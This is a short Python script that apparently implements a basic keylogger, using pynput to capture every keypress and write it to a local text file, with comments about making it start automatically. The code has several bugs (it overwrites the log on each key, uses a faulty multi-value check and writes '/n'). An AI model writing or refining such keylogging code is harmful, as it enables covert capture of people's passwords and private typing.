#imports
import datetime
from pynput.keyboard import Key, Listener
import time
import os
import os.path
import shutil
import sys

dirName = 'templogs'

#will check if directory exists and create directory assets
try:
     os.mkdir(dirName)
     print ("Directory", dirName, "created")
except:
    print("Direcotry", dirName, "already exists")

#put 32log.txt into the templogs file  
'''
save_path = 'C:/tempDir'
name_of_file = input("32log.txt")
completeName = os.path.join(save_path, name_of_file+".txt")
file1 = open(completeName, "w")
toFile = input("Hello")
file1.write(toFile)
file1.close()
'''
#sys.path.insert(1, '')


#code acutal
count = 0
keys = []

if not os.path.exists("kellogg/32log.txt"):
    	f= open("32log.txt","w+")


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

#writing the file into a txt document
def write_file(keys):
    with open("32log.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
            elif k.find("enter") >0:
                f.write("Screenshot")
                #find screenshot method
                f.write('/n')
            elif k.find("backspace") >0:
                f.write("")
            elif k.find("alt") >0:
                f.write("Alt")
            elif k.find("<173>" or "<174>" or "<175>") > 0:
                f.write("Audio Change")

def on_release(key):
    if key == Key.esc:
        return False
    #if we want we could try to make this save the txt file then run an inf. loop
    #then make it always begin start on run

with Listener(on_press=on_press, on_release=on_release)as listener:
    listener.join()
